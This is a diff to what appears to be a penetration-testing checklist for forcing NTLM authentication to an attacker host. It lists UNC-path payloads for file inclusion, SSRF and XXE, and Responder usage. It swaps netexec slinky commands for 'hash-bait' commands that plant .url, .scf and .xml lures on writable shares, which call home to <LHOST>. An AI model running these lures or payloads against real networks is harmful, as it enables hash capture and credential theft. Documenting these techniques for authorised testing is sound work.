@@ -12,11 +12,14 @@ sudo responder -I tun0 -A
 - [ ] File inclusion on a Windows web server: ?<Param>=\\<LHOST>\share\x
 - [ ] SSRF, XXE or an upload that takes a path: \\<LHOST>\share or file://<LHOST>/share
 - [ ] A shell as another user: dir \\<LHOST>\share
-At the pwn-broker prompt: tool install netexec and tool install impacket.
+At the pwn-broker prompt: tool install hash-bait and tool install impacket.
 A lure on every share I can write, for whoever browses it:
-nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important
-nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> NAME=important CLEANUP=True
-- [ ] The second line removes the lure afterwards
+hash-bait list -t <TargetIP> -u '<Username>' --pass '<Password>'
+hash-bait drop -t <TargetIP> -u '<Username>' --pass '<Password>' -s <Share> -c <LHOST> --no-listen
+hash-bait clean -t <TargetIP> -u '<Username>' --pass '<Password>' -s <Share>
+- [ ] drop plants .url, .scf and .xml lures that call home to <LHOST> for whoever browses them
+- [ ] --no-listen keeps Responder off: without it drop starts Responder itself, which belongs only in the labelled sections below
+- [ ] clean removes exactly what drop planted, matched by the lure's basename
 - [ ] The full path for Impacket with sudo: sudo does not search pwn-broker's bin folder
 Just an SMB listener, with no poisoning:
 sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
